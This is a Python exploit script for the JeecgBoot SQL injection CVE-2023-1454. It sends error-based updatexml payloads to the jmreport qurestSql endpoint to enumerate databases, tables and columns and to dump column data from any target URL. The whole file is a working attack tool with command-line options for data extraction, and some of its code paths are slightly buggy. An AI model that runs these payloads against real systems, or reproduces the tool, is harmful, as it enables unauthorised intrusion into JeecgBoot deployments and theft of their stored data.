#@Author: shad0w0
#!/user/bin/env python3
# -*- coding: utf-8 -*-
# JeecgBoot SQL（CVE-2023-1454）
import requests
import re
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_request(payload, url):
    url = url + "/jeecgboot/jmreport/qurestSql"
    headers = {
        "Content-Type": "application/json",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        'Connection':'close'
    }

    response = requests.post(url, json=payload, headers=headers, verify=False)
    return response.json()

def extract_strings_from_response(response_text):
    # Use regular expression to find the first string surrounded by tilde (~) or tilde (~) and single quote (')
    match = re.search(r'~(.*?)(?:~|\')', response_text)
    if match:
        first_match = match.group(1)
        print(first_match)
        return first_match
    else:
        exit(0)

def main():
    parser = argparse.ArgumentParser(description="JeecgBoot SQL（CVE-2023-1454）exp", usage="python3 CVE-2023-1454.py -h for help")
    parser.add_argument("-u", "--url", required=True, help="Specify the base URL")
    parser.add_argument("--current-db", action="store_true", help="View current database")
    parser.add_argument("--dbs", action="store_true", help="View all databases")
    parser.add_argument("-D", "--database", help="Specify the database name")
    parser.add_argument("--tables", action="store_true", help="View tables in the specified database")
    parser.add_argument("-T", "--table", help="Specify the table name")
    parser.add_argument("--columns", action="store_true", help="View columns in the specified table")
    parser.add_argument("-C", "--column", help="Specify the column name")
    

    args = parser.parse_args()

    payload_current_db = {
        "apiSelectId": "1316997232402231298",
        "id": "1' or '%1%' like (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or '%%' like '"
    }

    if args.current_db:
        response_data = send_request(payload_current_db)
        response_text = response_data.get("message", "")
        extract_strings_from_response(response_text)

    elif args.dbs:
        try:
            for limit_value in range(500):

                payload_dbs = {"apiSelectId": "1316997232402231298",
                               "id": f"1' or '%1%' like (updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit {limit_value},1),0x7e),1)) or '%%' like '"}

                response_data = send_request(payload_dbs, args.url)
                response_text = response_data.get("message", "")
                extract_strings_from_response(response_text)

        except KeyboardInterrupt:
            print("Program interrupted. Cleaning up...")

    elif args.table and args.database and args.column:

        try:
            payload_colnum = {"apiSelectId":"1316997232402231298","id":f"1' or '%1%' like (updatexml(1,concat(0x7e,(SELECT IFNULL(CAST(COUNT({args.column}) AS NCHAR),0x20) FROM {args.database}.`{args.table}`),0x7e),1)) or '%%' like '"}
            response_data = send_request(payload_colnum, args.url)
            response_text = response_data.get("message", "")
            limit = int(extract_strings_from_response(response_text))

            for limit_value in range(limit):

                payload_data = {"apiSelectId":"1316997232402231298","id":f"1' or '%1%' like (updatexml(1,concat(0x7e,(select {args.column}  from {args.database}.`{args.table}`  limit {limit_value},1),0x7e),1)) or '%%' like '"}

                response_data = send_request(payload_data, args.url)
                response_text = response_data.get("message", "")
                extract_strings_from_response(response_text)
        except KeyboardInterrupt:
            print("Program interrupted. Cleaning up...")

    elif args.table and args.database:

        try:
            args.database = args.database.encode("utf-8").hex()
            args.table = args.table.encode("utf-8").hex()
            for limit_value in range(500):

                payload_columns = {
                    "apiSelectId": "1316997232402231298",
                    "id": f"1' or '%1%' like (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x{args.database} and table_name=0x{args.table} limit {limit_value},1),0x7e),1)) or '%%' like '"
                }

                response_data = send_request(payload_columns, args.url)
                response_text = response_data.get("message", "")
                extract_strings_from_response(response_text)
        except KeyboardInterrupt:
            print("Program interrupted. Cleaning up...")

    elif args.database:
        try:
            args.database = args.database.encode("utf-8").hex()
            for limit_value in range(500):

                payload_tables = {"apiSelectId": "1316997232402231298",
                                  "id": f"1' or '%1%' like (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=0x{args.database} limit {limit_value},1),0x7e),1)) or '%%' like '"}

                response_data = send_request(payload_tables, args.url)
                response_text = response_data.get("message", "")
                extract_strings_from_response(response_text)
        except KeyboardInterrupt:
            print("Program interrupted. Cleaning up...")


if __name__ == "__main__":
    main()
